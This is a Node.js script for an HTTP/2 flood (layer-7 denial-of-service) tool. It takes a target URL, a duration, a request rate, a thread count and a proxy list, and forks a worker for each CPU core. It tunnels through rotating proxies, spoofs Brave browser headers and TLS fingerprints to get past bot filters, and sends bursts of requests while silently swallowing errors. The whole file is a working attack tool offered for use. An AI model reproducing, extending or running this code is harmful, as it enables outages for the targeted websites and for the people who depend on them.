const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
const v8 = require("v8");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node brave target time rate thread proxyfile`);
    process.exit();
}

const cplist = ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256'];
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "x25519"];

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET;
const secureProtocol = "TLS_method";
const secureContextOptions = {
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const Methods = ["GET", "POST", "HEAD"];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    icecool: process.argv.includes('--icecool'), // icecool optimaze ram, cpu
    dual: process.argv.includes('--dual'), // dualhyper
    brave: process.argv.includes('--brave')
};

var proxies = readLines(args.proxyFile); // Initialize proxies here

if (args.icecool) {
    proxies = proxies.filter(proxy => proxy.includes(':'));
    console.log(`random proxy: ${proxies.length} proxy loaded`);
}

const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 75;
const RESTART_DELAY = 3000;

const numCPUs = os.cpus().length; // Lấy số lượng core của hệ thống

if (cluster.isMaster) {
    console.clear();
    console.log(`target: ${process.argv[2]}`);
    console.log(`time: ${process.argv[3]}`);
    console.log(`rate: ${process.argv[4]}`);
    console.log(`thread: ${process.argv[5]}`);
    console.log(`proxyfile: ${process.argv[6]}`);
    console.log(`heap size: ${(v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2)}`);
    console.log(`icecool: ${args.icecool}, dual: ${args.dual}, brave: ${args.brave}`);
    console.log(`Number of CPU cores: ${numCPUs}`);

    // Fork worker cho mỗi core có sẵn trên hệ thống
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('Restarting in', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let i = 0; i < numCPUs; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 10000);

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function bexRandomString(min, max) {
    const length = randomIntn(min, max);
    const mask = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => mask[Math.floor(Math.random() * mask.length)]).join('');
}

function sanitizePath(path) {
    return path.replace(/[^a-zA-Z0-9-_./]/g, '');
}

const braveHeaders = {
    'X-Brave-Referrer': Math.random() < 0.3 ? 'https://www.google.com/' : undefined,
    'X-Brave-Vary': Math.random() < 0.3 ? 'Accept-Encoding' : undefined,
    'X-Brave-LastModified': Math.random() < 0.3 ? new Date().toUTCString() : undefined,
  };

const refers = ['google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'tiktok.com', 'github.com'];

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    
    const randomIntn = (min, max) => Math.floor(Math.random() * (max - min)) + min;

    const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.179 Safari/537.36 Brave/116.1.58.127`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.179 Safari/537.36 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36`,
    ];
    
    const finalUa = userAgents[Math.floor(Math.random() * userAgents.length)];
    const Ref = refers[Math.floor(Math.random() * refers.length)];
    let path = parsedTarget.path.replace("%RAND%", bexRandomString(12, 20));
    path = sanitizePath(path);

    const headersbex = {
        ":method": randomElement(Methods),
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": path,
        'User-Agent': finalUa,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'],
        'Accept-Encoding': 'gzip, deflate, br',
        "cache-control": "max-age=0",
        "sec-ch-ua": `"Brave";v="1.58", "Chromium";v="116", "Not_A Brand";v="24"`,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "Origin": `https://${parsedTarget.host}`,
        "Referer": `https://${Ref}`,
        ...braveHeaders
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: randomElement(cplist),
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: true,
            rejectUnauthorized: true,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            dhparam: 'modp4096',
        };

        // Điều chỉnh cho chế độ Brave
        if (args.brave) {
            tlsOptions.ALPNProtocols = ['h2'];
            tlsOptions.maxVersion = 'TLSv1.3';
            tlsOptions.minVersion = 'TLSv1.2';
            tlsOptions.ciphers = randomElement(cplist);
            tlsOptions.dhparam = 'modp4096';

            headersbex['User-Agent'] = `Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`;
            headersbex["sec-ch-ua"] = `"Brave";v="1.58", "Chromium";v="116", "Not_A Brand";v="24"`;
            headersbex['sec-ch-ua-mobile'] = '?1';  // Indicates a mobile device (iPhone)
            headersbex['sec-ch-ua-platform'] = '"iOS"';  // Indicates iOS platform
            headersbex['DNT'] = '1';  // Do Not Track
            headersbex['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
            headersbex['Accept-Encoding'] = 'gzip, deflate, br';  // Support for compressed content
            headersbex['Accept-Language'] = 'en-US,en;q=0.9';

            headersbex['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()';  // Block certain features for privacy
            headersbex['Pragma'] = 'no-cache';  // Privacy protection, avoid caching
            headersbex['Sec-Fetch-Site'] = 'same-origin';  // Same origin requests
            headersbex['Sec-Fetch-Mode'] = 'navigate';  // Navigation mode
            headersbex['Sec-Fetch-Dest'] = 'document';  // Target is a document
            
            if (Math.random() < 0.3) headersbex['X-Requested-With'] = 'XMLHttpRequest';
            if (Math.random() < 0.2) headersbex['Referer'] = 'https://www.google.com/';
            if (Math.random() < 0.1) headersbex['Origin'] = 'https://www.google.com/';
        }        

        const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsBex.allowHalfOpen = true;
        tlsBex.setNoDelay(true);
        tlsBex.setKeepAlive(true, args.time * 1000);
        tlsBex.setMaxListeners(0);

        const bexClient = http2.connect(parsedTarget.href, {
            protocol: "https:",
            createConnection: () => tlsBex,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxFrameSize: 16384,
                enablePush: false,
            },
        });

        const requestRate = args.dual ? args.Rate * 2 : args.Rate;
        const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
        const IntervalAttack = setInterval(() => {
            for (let i = 0; i < requestRate; i++) {
                const bex = bexClient.request(headersbex)
                    .on('response', response => {
                        bex.close();
                        bex.destroy();
                    });
                bex.end();
            }
        }, requestInterval);

        setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);

        bexClient.on("close", () => {
            bexClient.destroy();
            connection.destroy();
        });

        bexClient.on("error", () => {
            bexClient.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);